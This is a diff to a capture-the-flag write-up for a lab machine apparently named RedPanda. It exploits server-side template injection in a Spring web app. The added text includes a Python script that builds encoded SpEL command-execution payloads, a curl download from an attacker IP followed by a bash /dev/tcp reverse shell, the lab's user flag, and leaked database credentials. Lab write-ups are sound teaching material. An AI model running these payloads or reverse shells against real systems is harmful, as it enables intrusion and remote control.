@@ -172,9 +172,8 @@ Function `export` for each user:
 
 We tried SQLi injection but no luck.
 Go to to find the list injection attack from there.
-Test with `Burpsuite Intruder`:
 [https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) 
-
+Test with `Burpsuite Intruder`:
 ![[ssti_injection.png]]
 
 Look like it vulneable with character `#` and `*`.
@@ -214,5 +213,90 @@ We found somethings interest with `*`.
 ![[etc.passwd.png]]
 There is user `woodenk` at OS. And the web application is running on user `woodenk`.
 Lets go deeper to find a way to revershell.
-Humm. The code work but the string need to be converted from `ascii` char to `dec`.
-Lets try to 
+As above we see that the code only work when the each string have been converted from `asci` char to `char` code.
+Lets try write some code
+
+```python
+#!/usr/bin/python3  
+command = "whoami"  
+convert = []  
+payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('  
+payload2 = ''  
+
+payload = payload + "T(java.lang.Character).toString(%s)" % ord(command[0])  
+for i in range(1,len(command)):  
+    char = ""  
+    # print(ord(i))  
+    char = ord(command[i])  
+    payload2 = ".concat(T(java.lang.Character).toString(%s))" % char  
+    payload = payload + payload2  
+  
+payload = payload + ").getInputStream())}"  
+print(payload)
+```
+Replace the command with some payload.
+Tried to exploit with direct command `nc` - not working.
+After so many tried finally i got the revershell. Damn..
+- Step 1: Download the `rev.sh` to victim machine ( i am run `python -m http.server 8088` -  at current directory)
+```python
+#!/usr/bin/python3  
+command = "curl -o /tmp/rev.sh http://10.10.14.10:8088/rev.sh"  
+convert = []  
+payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('  
+payload2 = ''  
+
+payload = payload + "T(java.lang.Character).toString(%s)" % ord(command[0])  
+for i in range(1,len(command)):  
+    char = ""  
+    # print(ord(i))  
+    char = ord(command[i])  
+    payload2 = ".concat(T(java.lang.Character).toString(%s))" % char  
+    payload = payload + payload2  
+  
+payload = payload + ").getInputStream())}"  
+print(payload)
+```
+- Step 2:
+```python
+#!/usr/bin/python3  
+command = "bash /tmp/rev.sh"  
+convert = []  
+payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('  
+payload2 = ''  
+  
+payload = payload + "T(java.lang.Character).toString(%s)" % ord(command[0])  
+for i in range(1,len(command)):  
+    char = ""  
+    # print(ord(i))  
+    char = ord(command[i])  
+    payload2 = ".concat(T(java.lang.Character).toString(%s))" % char  
+    payload = payload + payload2  
+  
+payload = payload + ").getInputStream())}"  
+print(payload)
+```
+
+The `rev.sh` :
+```bash
+#!/bin/bash
+bash -c "bash -i >& /dev/tcp/10.10.14.10/1234 0>&1"
+```
+
+Copy the output of step 1 and step 2 to use with `Burp Repeater`. 
+![[step1_burp_repeater.png]]
+![[step2_burp_repeater.png]]
+
+We got the revershell. Well.
+
+The `user.txt` flag:
+```
+efaa8f33e98ff3993b20c6bade76a83a
+```
+
+```bash
+grep -R "3306" .
+Binary file ./target/classes/com/panda_search/htb/panda_search/SqlController.class matches
+Binary file ./target/classes/com/panda_search/htb/panda_search/MainController.class matches
+./src/main/java/com/panda_search/htb/panda_search/MainController.java:            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
+woodenk@redpanda:/opt/panda_search$
+```
